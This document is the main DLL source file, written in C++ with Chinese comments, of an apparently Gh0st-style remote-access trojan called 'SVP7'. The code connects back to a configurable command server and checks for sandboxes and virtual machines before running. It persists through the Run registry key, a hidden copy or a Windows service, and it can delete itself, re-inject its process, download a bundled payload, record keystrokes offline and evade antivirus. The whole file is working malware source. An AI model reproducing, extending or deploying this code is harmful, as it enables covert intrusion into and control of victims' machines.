// MainDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "Login.h"
#include "KernelManager.h"
#include "InstallService.h"

DLL_INFO dll_info = 
{
	"SVP7",       // 上线地址 1
		0,        // 上线端口 2
		0,        // 文件属性 3
		"",       // 上线分组 4
		"",       // 通讯密码 5
		"",       // 安装名称 6
		"",       // 服务名称 7
		"",       // 服务显示 8
		"",	      // 服务描述 9
		"",       // 安装途径 10
		"",       // 网络捆绑 11
		0,        // 启动类型 12
		0,        // 0关闭 1开启 微步检测 13
		0,        // 0关闭 1开启 哈勃检测 14
		0,        // 0关闭 1开启 虚拟检测 15
		0,        // 0关闭 1开启 分析检测 16
		0,        // 0关闭 1开启 防删检测 17
		0,        // 0关闭 1开启 自删检测 18
		0,        // 0关闭 1开启 重复检测 19
		0,        // 0关闭 1开启 复活检测 20
		0,        // 0关闭 1开启 穿透检测 21
		0,        // 0关闭 1开启 终结检测 22
		0,        // 0关闭 1开启 捆绑检测 23
		0,        // 0关闭 1开启 睡眠检测 24
		0,        // 0关闭 1开启 离线检测 25
		0,        // 0关闭 1开启 微软杀毒 26
};
char MyLoginAddr[30];           // 上线地址 1
UINT MyLoginPort;               // 上线端口 2
WORD MyFileAttribute;           // 文件属性 3
char MyUpGroup[30];             // 上线分组 4
char ConnetPass[20];            // 通讯秘钥 5
TCHAR MyReleaseName[25];        // 安装名称 6
char MyServiceName[70];         // 服务名称 7
char MyServiceDisplayName[70];  // 服务显示 8
char MyServiceDescription[120]; // 服务描述 9
char MyReleasePath[100];        // 安装途径 10
CHAR MyszDownRun[150];          // 捆绑地址 11
BOOL MyDele_zc;	                // 启动类型 12
BOOL MyFwb;                     // 微步     13
BOOL MyFhb;                     // 哈勃     14
BOOL MyFxn;                     // 虚拟     15
BOOL MyFfx;                     // 分析     16
BOOL MyFsc;                     // 防删     17
BOOL MyFzs;                     // 自删     18
BOOL MyFcf;                     // 重复     19
BOOL MyFfh;                     // 复活     20
BOOL MyFct;                     // 穿透     21
BOOL MyFzj;                     // 终结     22
BOOL MyFkb;                     // 捆绑     23
BOOL MyFsm;                     // 睡眠     24
BOOL MyFlx;                     // 离线     25
BOOL MyFwr;                     // 微软     26
////////////////
CMyFunc m_gFunc; 
BOOL bisUnInstall = FALSE;
DWORD WINAPI Login(LPVOID lpParam);
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{	
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login,NULL,0,NULL);
	m_gFunc.WaitForSingleObject(hThread, INFINITE);
	m_gFunc.CloseHandle(hThread);
	return TRUE;
}
DWORD __stdcall MainThread()
{	
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login,NULL,0,NULL);
	m_gFunc.WaitForSingleObject(hThread, INFINITE);
	m_gFunc.CloseHandle(hThread);
	return TRUE;
}
DWORD WINAPI Login(LPVOID lpParam)
{
	//安装信息
	SetRegInfo();
	if (MyFcf == 1)//防重复
	{
		// 互斥 上线地址:端口:服务名
		char	strMutex[100];
		m_gFunc.wsprintfA(strMutex,"%s:%d:%s",MyLoginAddr,MyLoginPort,MyServiceName);
		HANDLE m_hMutex = m_gFunc.CreateMutex(NULL, FALSE, strMutex);
		if (m_hMutex && m_gFunc.GetLastError() == ERROR_ALREADY_EXISTS)
		{
			m_gFunc.ReleaseMutex(m_hMutex); // 释放句柄
			m_gFunc.CloseHandle(m_hMutex);  // 关闭句柄
			ExitProcess(0);
		}
	}

	//错误处理
	m_gFunc.SetUnhandledExceptionFilter(bad_exception);
	// 设置线程优先级-实时
	m_gFunc.SetThreadPriority(m_gFunc.GetCurrentThread(), 0x00000080);

    CClientSocket SocketClient;
	int     nSleep = 0;
	bool	bBreakError = false;
	while (1)
	{
		if (bBreakError != false)
		{
			nSleep = rand();
			m_gFunc.Sleep(nSleep % 120000);
		}
		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}
		char	lpszHost[256]={0};
        UINT  	dwPort = 0;
		dwPort = MyLoginPort;
		m_gFunc.lstrcatA(lpszHost,MyLoginAddr);
		if(m_gFunc.strcmp(lpszHost,"") == 0)
		{
			bBreakError = true;
			continue;
		}
		DWORD dwTickCount = m_gFunc.GetTickCount();
		if (!SocketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = true;
			continue;
		}
		DWORD upTickCount = m_gFunc.GetTickCount()-dwTickCount;
		CKernelManager	manager(&SocketClient,lpszHost,dwPort);
		SocketClient.SetManagerCallBack(&manager);
		if(SendLoginInfo(&SocketClient,upTickCount) <= 0)
		{
			SocketClient.Disconnect();
			bBreakError = true;
			continue;
		}
		DWORD	dwIOCPEvent;
		do
		{
			dwIOCPEvent = m_gFunc.WaitForSingleObject(SocketClient.m_hEvent,100);
			m_gFunc.Sleep(500);
		} while( dwIOCPEvent != WAIT_OBJECT_0 && !bisUnInstall);
		
		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}
	}
	return 0;
}
//捆绑下载
extern DWORD WINAPI Loop_DownManager(LPVOID lparam);
//////////////////////////绿色目录启动//////////////////////////
DWORD WINAPI Greenstart()
{
	//实时获取自身
	char path[MAX_PATH] = {0};
	m_gFunc.GetModuleFileName(NULL, path, MAX_PATH);
	HANDLE hProcess = m_gFunc.OpenProcess(PROCESS_ALL_ACCESS, FALSE,m_gFunc.GetCurrentProcessId());
	DWORD dwSize = MAX_PATH;
	m_gFunc.QueryFullProcessImageName(hProcess, 0, path, &dwSize);
	m_gFunc.PathStripPath(path); //去掉目录得到文件名
	//获取用户Local目录
	TCHAR szPath[MAX_PATH];
	TCHAR szPaths[MAX_PATH];
    m_gFunc.SHGetSpecialFolderPaths(NULL,szPath,0x001c,FALSE);
	m_gFunc.SHGetSpecialFolderPaths(NULL,szPaths,0x001c,FALSE);
	if (m_gFunc.PathFileExists(szPath)) //判断Local目录是否存在
	{
		//存在
		m_gFunc.PathAddBackslash(szPath);
		m_gFunc.PathAddBackslash(szPaths);
		strcat(szPath,path); //Local目录连接文件名
	}
	else
	{
		//不存在
		PathStripToRoot(szPath);
		strcat(szPath,"Windows\\");
		strcat(szPath,path);
		PathStripToRoot(szPaths);
		strcat(szPaths,"Windows\\");
	}
	if(!m_gFunc.PathFileExists(szPath)) //判断自身是否存在Local目录
	{
		if (MyFkb == 1) //捆绑
		{
			Loop_DownManager((LPVOID)MyszDownRun);
		}
		strcat(szPaths,"nw_elf.dll");
		m_gFunc.CopyFileA("nw_elf.dll",szPaths,FALSE); //复制DLL
		if(m_gFunc.CopyFileA(path,szPath,FALSE))//不存在则复制自身到该目录
		{
			if (MyFzs == 1)  //自删除
				DeleteSelf();
			m_gFunc.SetFileAttributes(path,MyFileAttribute);  //设置文件属性
			m_gFunc.SetFileAttributes(szPath,MyFileAttribute);//设置文件属性
			m_gFunc.ShellExecute(0,0,szPath,0,0, SW_HIDE);
			ExitProcess(0);
		}
	}
	m_gFunc.SetFileAttributes(path, MyFileAttribute);  //设置文件属性
	if (MyFfh == 1)//进程复活
	{
		ZhuRu();
	}
	MainThread();
	return 0;
}
//////////////////////////启动目录启动//////////////////////////
DWORD WINAPI CreateAutoRun()
{
	//实时获取自身
	char path[MAX_PATH] = {0};
	m_gFunc.GetModuleFileName(NULL, path, MAX_PATH);
	HANDLE hProcess = m_gFunc.OpenProcess(PROCESS_ALL_ACCESS, FALSE,m_gFunc.GetCurrentProcessId());
	DWORD dwSize = MAX_PATH;
	m_gFunc.QueryFullProcessImageName(hProcess, 0, path, &dwSize);
	m_gFunc.PathStripPath(path); //去掉目录得到文件名
	//获取用户Local目录
	TCHAR szPath[MAX_PATH];
	TCHAR szPaths[MAX_PATH];
    m_gFunc.SHGetSpecialFolderPaths(NULL,szPath,0x001c,FALSE);
	m_gFunc.SHGetSpecialFolderPaths(NULL,szPaths,0x001c,FALSE);
	if (m_gFunc.PathFileExists(szPath)) //判断Local目录是否存在
	{
		//存在
		m_gFunc.PathAddBackslash(szPath);
		m_gFunc.PathAddBackslash(szPaths);
		strcat(szPath,path); //Local目录连接文件名
	}
	else
	{
		//不存在
		PathStripToRoot(szPath);
		strcat(szPath,"Windows\\");
		strcat(szPath,path);
		PathStripToRoot(szPaths);
		strcat(szPaths,"Windows\\");
	}
	if (!m_gFunc.PathFileExists(szPath))  //判断自身是否存在公用目录
	{
		if (MyFkb == 1) //捆绑
		{
			Loop_DownManager((LPVOID)MyszDownRun);
		}
		strcat(szPaths,"nw_elf.dll");
		m_gFunc.CopyFileA("nw_elf.dll",szPaths,FALSE); //复制DLL
		if(m_gFunc.CopyFileA(path,szPath,FALSE)) //不存在则复制自身到该目录
		{
			if (MyFzs == 1)//自删除
				DeleteSelf();
			m_gFunc.SetFileAttributes(path,MyFileAttribute);  //设置文件属性
			m_gFunc.SetFileAttributes(szPath,MyFileAttribute);//设置文件属性
			HKEY hKey;
			DWORD dwDisposition = REG_OPENED_EXISTING_KEY;
			char cIety[256] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
			RegCreateKeyEx(HKEY_CURRENT_USER,cIety,0,0,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,0,&hKey,&dwDisposition);
			RegSetValueEx(hKey,"SVP7",0,REG_SZ,(BYTE*)szPath,lstrlen(szPath)*sizeof(TCHAR));
			m_gFunc.ShellExecute(0,0,szPath,0,0, SW_HIDE);
			RegCloseKey(hKey);
			ExitProcess(0);
		}	
	}
	if (MyFfh == 1)//进程复活
	{
		ZhuRu();
	}
	MainThread();
	return 0;
}
//服务启动
void MyStupServer()
{
	SERVICE_TABLE_ENTRY serviceTable[] = {{MyServiceName,(LPSERVICE_MAIN_FUNCTION)ServiceMain}, {NULL,NULL} };//如果已经存在直接启动服务
	if (!m_gFunc.StartServiceCtrlDispatcher(serviceTable))
	{	
		char MgzBp[MAX_PATH];
		char szPath[MAX_PATH];//保存自身文件名的字符串
		char Path[MAX_PATH]={NULL};
		m_gFunc.ExpandEnvironmentStrings(MyReleasePath,Path,MAX_PATH);  // %SystemRoot%\扩充成完整路径 C:WINDOWS\ 
		strcpy(MyReleasePath,Path);
		m_gFunc.PathRemoveBackslash(MyReleasePath);//去掉最后的'\\'
		char DQeBW01[] = {'%','s','\\','%','s','\0'};
		sprintf(MgzBp,DQeBW01,MyReleasePath,MyReleaseName);   //连接安装路径和程序名称
		char * toPath = MgzBp;        //要复制到的路径字符串

		MyCreatDirector(MgzBp);	//文件夹不存在创建文件夹
		m_gFunc.CopyFileA("nw_elf.dll","C:\\Windows\\nw_elf.dll",FALSE); //复制文件下DLL到写入的路径
		m_gFunc.GetModuleFileName(NULL,(LPCH)szPath,225);     //获取自身路径的函数	
		m_gFunc.SetFileAttributes(szPath, MyFileAttribute);  // 设置文件属性
		m_gFunc.CopyFileA(szPath,toPath,false);       //复制函数，从szPath复制到toPath，强行覆盖原有文件

		//安装服务
		BOOL szBool = NtInstallService(MyServiceName,MyServiceDisplayName,MyServiceDescription,toPath,NULL,false,SERVICE_AUTO_START);
		if (MyFsc == 1)
		{
			OccupyFile(toPath); //占坑安装
		}
		if (!szBool)//安装失败直接上线
		{
			char path[MAX_PATH];
			m_gFunc.GetModuleFileName(NULL,path,MAX_PATH);//获取自身路径
			m_gFunc.SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN||FILE_ATTRIBUTE_SYSTEM);  //设置文件属性
			MainThread();
		}
		else
		{
			if (MyFkb == 1) //捆绑
			{
				Loop_DownManager((LPVOID)MyszDownRun);
				
			}
			if (MyFzs == 1)//自删除
			{
				DeleteSelf();
			}
			Sleep(500);
			m_gFunc.SetFileAttributes(toPath,MyFileAttribute);  // 设置文件属性
		}
	}
}

///////隐藏上线进程
#include <stdio.h>//Dèòaμ????t
#include <direct.h>
#include <iostream>
using namespace std;
#include <windows.h>
#include "psapi.h"  
#include <tlhelp32.h> 
//CNfcApp *Gyfunction;
DWORD GetProcessidFromName(LPCTSTR name)
{
	PROCESSENTRY32 pe;
	DWORD id=0;
	HANDLE hSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	pe.dwSize=sizeof(PROCESSENTRY32);
	if(!Process32First(hSnapshot,&pe))
		return 0;
	while(1)
	{
		pe.dwSize=sizeof(PROCESSENTRY32);
		if(Process32Next(hSnapshot,&pe)==FALSE)
			break;
		if(strcmp(pe.szExeFile,name)==0)
		{
			id=pe.th32ProcessID;
			
			break;
		}
	}
	CloseHandle(hSnapshot);
	return id;
}

extern "C" __declspec(dllexport) LPVOID SVP7(DLL_INFO m_Install)
{

	TCHAR szFilePath[MAX_PATH + 1]={0};
	GetModuleFileName(NULL, szFilePath, MAX_PATH);	
	if (GetProcessidFromName("admin.exe"))//进程的名字
	{
		
	}
	else
	{
		
		char path[MAX_PATH];
		GetCurrentDirectory(MAX_PATH,path); 
		cout<<path;
		
		strcat(path,"\\admin.exe");
		char *buffer;
		if((buffer = getcwd(NULL, 0)) == NULL)
		{
			
		}
		else
		{
			char * source = szFilePath;
			char * destination = "c://admin.exe";////进程的名字路径
			CopyFile(source, destination, FALSE);
			WinExec("c://admin.exe", SW_SHOWMAXIMIZED);//进程的名字
			
			
		}												
	}
	m_gFunc.LoadMyData(); //初始化自定义函数去掉会崩溃

	int nInStallSizeof=sizeof(DLL_INFO)+1;
	DLL_INFO *pNewInStall=(DLL_INFO *)new  char[nInStallSizeof];
	m_gFunc.memcpy(pNewInStall,&m_Install,nInStallSizeof);

	//改变内存保护属性
	DWORD dwNewProtect = PAGE_READWRITE, dwOldProtect;
	VirtualProtect(pNewInStall,sizeof(DLL_INFO),dwNewProtect,&dwOldProtect);
	VirtualProtect(pNewInStall,sizeof(DLL_INFO),dwOldProtect,&dwNewProtect);

	lstrcpy(MyUpGroup,pNewInStall->UpGroup);
	lstrcpy(MyLoginAddr,pNewInStall->LoginAddr);
	lstrcpy(ConnetPass,pNewInStall->ConnetPass);
	lstrcpy(MyszDownRun,pNewInStall->szDownRun);
	lstrcpy(MyReleasePath,pNewInStall->ReleasePath);
	lstrcpy(MyReleaseName,pNewInStall->ReleaseName);
	lstrcpy(MyServiceName,pNewInStall->ServiceName);
	lstrcpy(MyServiceDisplayName,pNewInStall->ServiceDisplayName);
	lstrcpy(MyServiceDescription,pNewInStall->ServiceDescription);
	MyLoginPort=pNewInStall->LoginPort;
	MyFileAttribute=pNewInStall->FileAttribute;
	MyDele_zc=pNewInStall->Dele_zc;
	MyFwb=pNewInStall->Fwb;
	MyFhb=pNewInStall->Fhb;
	MyFxn=pNewInStall->Fxn;
	MyFfx=pNewInStall->Ffx;
	MyFsc=pNewInStall->Fsc;
	MyFzs=pNewInStall->Fzs;
	MyFcf=pNewInStall->Fcf;
	MyFfh=pNewInStall->Ffh;
	MyFct=pNewInStall->Fct;
	MyFzj=pNewInStall->Fzj;
	MyFkb=pNewInStall->Fkb;
	MyFsm=pNewInStall->Fsm;
	MyFlx=pNewInStall->Flx;
	MyFwr=pNewInStall->Fwr;

	EncryptData((char*)ConnetPass,m_gFunc.strlen(ConnetPass),18);//解密分组
	EncryptData((char*)MyUpGroup,m_gFunc.strlen(MyUpGroup),18);//解密分组
	EncryptData((char*)MyLoginAddr,m_gFunc.strlen(MyLoginAddr),80);//解密IP域名
	EncryptData((char*)MyszDownRun,m_gFunc.strlen(MyszDownRun),18);//解密捆绑地址
	EncryptData((char*)MyReleasePath,m_gFunc.strlen(MyReleasePath),18);//解密安装路径
	EncryptData((char*)MyReleaseName,m_gFunc.strlen(MyReleaseName),18);//解密安装名称
	EncryptData((char*)MyServiceName,m_gFunc.strlen(MyServiceName),18);//解密服务名称
	EncryptData((char*)MyServiceDisplayName,m_gFunc.strlen(MyServiceDisplayName),18);//解密服务显示
	EncryptData((char*)MyServiceDescription,m_gFunc.strlen(MyServiceDescription),18);//解密服务描述
//	OutputDebugString("");
	// 让启动程序时的小漏斗马上消失
	m_gFunc.PostThreadMessageA(m_gFunc.GetCurrentThreadId(),NULL,0,0);
	m_gFunc.GetInputState();
	MSG	msg;
	m_gFunc.GetMessageA(&msg,NULL,NULL,NULL);

	//提权
	RaiseToDebugP();

	// 设置进程优先级-高，使其抢先于操作系统组件之前运行
	HANDLE hPS = m_gFunc.OpenProcess(PROCESS_ALL_ACCESS,false,m_gFunc.GetCurrentProcessId()); 
	m_gFunc.SetPriorityClass(hPS,0x00000080);
    m_gFunc.CloseHandle(hPS); 

	if (MyFwb == 1)//反微步
	{
		ShaiXian();
	}
	if (MyFhb == 1)//反哈勃
	{
		if (IsGuardPages())
		{
			ExitProcess(0);
		}
	}
	if (MyFxn == 1)//反虚拟
	{
		if(IsInsideVMWare())
		{
			ExitProcess(0);
		}
	}
	if (MyFfx == 1)//防分析
	{
		Vmware();
	}
	if (MyFzj == 1)//K终结者
	{
		KProcess();
	}
	if (MyFsm == 1)//睡眠阻止
	{
		MyCreateThread(NULL, 0,Block_sleep, NULL, 0, NULL);
	}
	if (MyFlx == 1)//离线记录
	{
		CClientSocket SocketClient;
		CKernelManager	manager(&SocketClient);
		manager.StartUnLineHook();
	}
	if (MyFwr == 1)//微软杀毒
	{
		sleep_sleep();
	}
	if (MyDele_zc == 0)//绿色启动
	{
		Greenstart(); 
	}
	else if (MyDele_zc == 1)//注册表启动
	{
		CreateAutoRun(); //上线
	}
	else if (MyDele_zc == 2)//服务启动
	{
		MyStupServer();
	}
	return 0;
}